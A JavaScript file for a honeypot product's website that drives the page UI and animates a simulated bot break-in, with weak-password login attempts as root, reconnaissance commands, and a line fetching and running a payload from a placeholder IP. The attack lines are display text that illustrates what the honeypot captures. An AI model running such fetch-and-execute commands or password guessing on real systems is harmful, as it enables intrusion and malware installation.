// SuckerPot site: theme toggle, copy buttons, and the hero replay of a fake bot session.
// No dependencies, no network requests.
;(function () {
  "use strict"

  var root = document.documentElement
  var params = new URLSearchParams(location.search)
  // ?motion=off gives the final state at once (used for screenshots), like the dashboard.
  var still = params.get("motion") === "off" || matchMedia("(prefers-reduced-motion: reduce)").matches

  // Theme toggle
  var themeBtn = document.getElementById("theme")
  if (themeBtn) {
    themeBtn.addEventListener("click", function () {
      var next = root.dataset.theme === "light" ? "dark" : "light"
      root.dataset.theme = next
      var meta = document.querySelector('meta[name="theme-color"]')
      if (meta) meta.content = next === "light" ? "#f7f7f8" : "#0b0c0e"
      try {
        localStorage.setItem("selfhostr.theme", next)
      } catch (e) {}
    })
  }

  // Copy buttons
  document.querySelectorAll("[data-copy]").forEach(function (btn) {
    btn.addEventListener("click", function () {
      var src = document.getElementById(btn.getAttribute("data-copy"))
      if (!src || !navigator.clipboard) return
      navigator.clipboard.writeText(src.textContent).then(function () {
        btn.textContent = "Copied"
        setTimeout(function () {
          btn.textContent = "Copy"
        }, 1600)
      }, function () {})
    })
  })

  // Network figure: slow flowing dashes, only while visible.
  var netfig = document.querySelector(".netfig")
  if (netfig && !still && "IntersectionObserver" in window) {
    new IntersectionObserver(function (entries) {
      entries.forEach(function (e) {
        netfig.classList.toggle("live", e.isIntersecting)
      })
    }).observe(netfig)
  }

  // Hero replay
  var term = document.getElementById("term")
  if (!term) return
  var stages = document.querySelectorAll(".stages li")
  var cards = document.querySelectorAll("[data-reveal]")
  var replayBtn = document.getElementById("replay")

  var P = '<span class="t-prompt">root@srv-web01:~#</span> '
  var D = function (s) {
    return '<span class="t-dim">' + s + "</span>"
  }
  // kind "out": printed at once; kind "cmd": typed after the prompt. wait: pause before the line (ms).
  var script = [
    { kind: "out", wait: 300, html: D("login") + " root / admin             " + D("refused") },
    { kind: "out", wait: 420, html: D("login") + " root / 123456            " + D("refused") },
    { kind: "out", wait: 420, html: D("· · · 34 more passwords refused") },
    { kind: "out", wait: 700, html: D("login") + ' root / P@ssw0rd          <span class="t-ok">accepted</span>' },
    { kind: "cmd", wait: 600, text: "uname -a" },
    { kind: "out", wait: 220, html: "Linux srv-web01 5.15.0-91-generic x86_64 GNU/Linux" },
    { kind: "cmd", wait: 500, text: "nproc" },
    { kind: "out", wait: 200, html: "4" },
    { kind: "cmd", wait: 600, text: "wget http://198.51.100.23/x86; sh x86" },
  ]
  var CURSOR = '<span class="t-cursor"></span>'
  var timers = []
  var run = 0

  function esc(s) {
    return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
  }
  function later(fn, ms) {
    timers.push(setTimeout(fn, ms))
  }
  function setStage(n) {
    stages.forEach(function (li, i) {
      li.classList.toggle("on", i <= n && !li.classList.contains("coming"))
    })
  }
  function finalText() {
    return (
      script
        .map(function (l) {
          return l.kind === "cmd" ? P + esc(l.text) : l.html
        })
        .join("\n") +
      "\n" +
      P +
      CURSOR
    )
  }
  function showFinal() {
    term.innerHTML = finalText()
    cards.forEach(function (c) {
      c.classList.remove("wait")
    })
    setStage(2)
  }

  function play() {
    run += 1
    var me = run
    timers.forEach(clearTimeout)
    timers = []
    var lines = []
    cards.forEach(function (c) {
      c.classList.add("wait")
    })
    setStage(0)
    term.innerHTML = CURSOR
    var i = 0

    function render(current) {
      term.innerHTML = lines.concat([current]).join("\n")
    }
    function next() {
      if (me !== run) return
      if (i >= script.length) {
        lines.push(P + CURSOR)
        term.innerHTML = lines.join("\n")
        later(function () {
          setStage(1)
          cards[0] && cards[0].classList.remove("wait")
        }, 700)
        later(function () {
          setStage(2)
          cards[1] && cards[1].classList.remove("wait")
        }, 2100)
        return
      }
      var l = script[i++]
      later(function () {
        if (l.kind === "out") {
          lines.push(l.html)
          render(CURSOR)
          next()
          return
        }
        var k = 0
        ;(function type() {
          if (me !== run) return
          k += 1
          render(P + esc(l.text.slice(0, k)) + CURSOR)
          if (k < l.text.length) later(type, 24 + Math.random() * 40)
          else
            later(function () {
              lines.push(P + esc(l.text))
              next()
            }, 260)
        })()
      }, l.wait)
    }
    next()
  }

  if (still) {
    showFinal()
  } else {
    play()
  }
  if (replayBtn) {
    replayBtn.addEventListener("click", function () {
      if (still) showFinal()
      else play()
    })
  }
})()
